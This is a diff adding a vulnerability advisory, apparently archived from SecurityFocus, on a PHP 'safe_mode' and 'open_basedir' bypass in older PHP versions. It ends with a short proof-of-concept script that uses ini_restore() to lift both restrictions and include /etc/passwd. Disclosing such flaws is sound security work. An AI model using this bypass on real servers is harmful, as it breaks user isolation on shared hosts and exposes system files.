@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/19933/info
+
+PHP is prone to a 'safe_mode' and 'open_basedir' restriction-bypass vulnerability. Successful exploits could allow an attacker to access sensitive information or to write files in unauthorized locations.
+
+This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; in such cases, the 'safe_mode' and 'open_basedir' restrictions are expected to isolate users from each other.
+
+These issues are reported to affect PHP versions 5.1.6, 4.4.4, and earlier.
+
+Reports indicate that fixes may be available to address this issue, but this has not been confirmed.
+
+<?
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include("/etc/passwd");
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include("/etc/passwd");
+?>
